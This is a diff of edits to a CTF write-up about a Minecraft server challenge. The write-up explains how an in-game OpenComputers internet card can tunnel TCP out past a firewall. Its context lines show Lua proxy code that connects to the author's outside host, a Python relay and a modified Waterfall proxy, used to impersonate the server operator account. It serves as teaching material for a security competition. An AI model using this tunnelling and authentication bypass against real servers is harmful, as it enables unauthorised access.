@@ -4,10 +4,9 @@
 > JOIN MY NEW COOL MINECRAFT SERVER, PLS NO HAX :)
 
 ## Challenge Setup
-The challenge server consists of a Waterfall proxy, which is connected to a server running SpongeForge server. The only installed mod on the server is the [OpenComputers](https://github.com/MightyPirates/OpenComputers) mod.  
+The challenge server consists of a Waterfall proxy, which is connected to a server running SpongeForge. The only installed mod on the server is the [OpenComputers](https://github.com/MightyPirates/OpenComputers) mod.  
   
-The Waterfall proxy is also connected to a Queue server. When we first connect to the proxy, we are moved to the queue server. After completing a simple parkour challenge (flyhacks ftw), we are moved to a SpongeForge server.  
-Each SpongeForge server allows one player to connect at a time.
+The Waterfall proxy is also connected to a Queue server. When we first connect to the proxy, we are moved to the queue server. After completing a simple parkour challenge (flyhacks ftw), we are moved to a SpongeForge server. Each SpongeForge server allows one player to connect at a time.
 
 ![](diagrams/png/half_diagram.png)
   
@@ -21,7 +20,7 @@ public void onServerStart(GameStartedServerEvent ev) {
 	Sponge.getCommandManager().register(this,
 			CommandSpec.builder().description(Text.of("Obtain the flag")).permission("*")
 ```
-Furthermore, the plugin also hints that it is possible for admins to join the SpongeForge server, more on this later.
+Furthermore, the plugin also hints that it is possible for admins to join the SpongeForge server, which will become important later.
 ```java
 @Listener
 public void onPlayerDisconnect(ClientConnectionEvent.Disconnect ev) {
@@ -38,7 +37,7 @@ The `server.properties` file reveals that the server is running on port `31337`.
 
 Finally, the `ops.json` file contains the following:
 ```json
-]
+[
   {
     "uuid": "8526be5c-2c8b-4661-83eb-a160bf9818ec",
     "name": "ALLESCTF",
@@ -50,7 +49,7 @@ Finally, the `ops.json` file contains the following:
 There is a single Operator account called `ALLESCTF`. If we can impersonate this account, we can promote our own account to operator as well.
 
 ## But what about this computer thingy?
-The server only has a single mod installed, so it's probably important somehow. After joining the server, we find ourselves on a small island, with a computer setup on the shore. When examining the computer, I noticed that it contains an [internet card](https://ocdoc.cil.li/item:internet_card)  
+The server only has a single mod installed, so it's probably important somehow. After joining the server, we find ourselves on a small island, with a computer setup on the shore. When examining the computer, I noticed that it contains an [internet card](https://ocdoc.cil.li/item:internet_card).  
 The internet component supports both raw TCP sockets, and HTTP requests. The catch here is that these TCP sockets will originate **from** the SpongeForge server, and thus will not be shot down by the firewall rules. Furthermore, it is also able to connect to any IP on the internet.  
   
 To drive home the point that these sockets are stupidly powerful, people have written actual [FTP servers](https://github.com/Jereq/OC-FTP) and [IRC clients](https://github.com/MightyPirates/OpenComputers/blob/master-MC1.7.10/src/main/resources/assets/opencomputers/loot/irc/usr/bin/irc.lua) using them.
@@ -60,8 +59,8 @@ Now that we have a way to create a TCP proxy from inside the SpongeForce server,
 
 ### Final goal
 Let's start by giving a quick overview of the game plan here. We want to setup a TCP session through an OpenComputers program. We will need 3 pieces of software to realise this goal:  
-* An proxy written in Lua
-* A "middleware" proxy (written in Python)
+* A proxy written in Lua, to run the computer.
+* A "middleware" proxy (written in Python).
 * An "Evil" Waterfall proxy, to handle authentication.
   
 ![](diagrams/png/full_diagram.png)
@@ -69,14 +68,14 @@ Let's start by giving a quick overview of the game plan here. We want to setup a
 **note:** While I used a different machine to host the Python and Waterfall proxies, there is no reason you couldn't host everything on your own machine. It was just slightly more convenient for me to do it this way.
 
 ### Lua Proxy
-The Lua proxy will run on the OpenComputers computer. It's job is to setup two connections, one to the attackers server, and another to the SpongeForge server. Then it just needs to pass TCP data back and forth to create a connection.  
+The Lua proxy will run on the in-game computer. Its job is to setup two connections, one connection to the attackers server, and another connection to the SpongeForge server. Then it just needs to pass TCP data back and forth to create a connection.  
   
 Here is the code for our proxy:
 ```lua
 local component = require("component")  
 local net = component.internet
 
--- Remote proxy
+-- Remote proxy  --  your domain/IP here V
 local remote = net.connect("ctf.bricked.tech", 1337)  
 -- Local minecraft server
 local local_serv = net.connect("0.0.0.0", 31337)  
@@ -108,7 +107,7 @@ local_serv:close()
 The Python proxy will serve as "middleware" between our Waterfall server and the Lua proxy. It starts by listening for an incoming connection from the Lua proxy. Once it connects, the proxy starts listening for a connection from our "Evil" Waterfall proxy.  
 Once both connections are established, it behaves pretty much the same as the previous proxy.  
   
-The proxy is not very robust, but it only needs to work once ¯\\_(ツ)_/¯.
+This proxy is not very robust, but it only needs to work once ¯\\\_(ツ)\_/¯.
 ```python
 import socket
 
@@ -185,7 +184,7 @@ index 1d419de5..f14dd9c5 100644
          Callback<LoginEvent> complete = new Callback<LoginEvent>()
 ```
 
-Compile Waterfall and run it to generate a `config.yml` file. Then, make the following changes to the config:
+Now, we can compile Waterfall and execute it to generate a `config.yml` file. We need to make the following changes to the config:
 * online_mode: false
 * forge_support: true
 * servers:
@@ -194,6 +193,7 @@ Compile Waterfall and run it to generate a `config.yml` file. Then, make the fol
 
 ## Flag time
 With all software in place, it is time to capture the flag!  
+  
 First we need to craft an [OpenOs floppy disk](https://ocdoc.cil.li/item:openos_floppy) with the resources on the island. Next we can boot up the computer and paste our Lua code into a new file. Make sure the Python proxy is running, before executing the Lua script.  
 When the script is executed, a connection will appear in the Python proxy.  
   
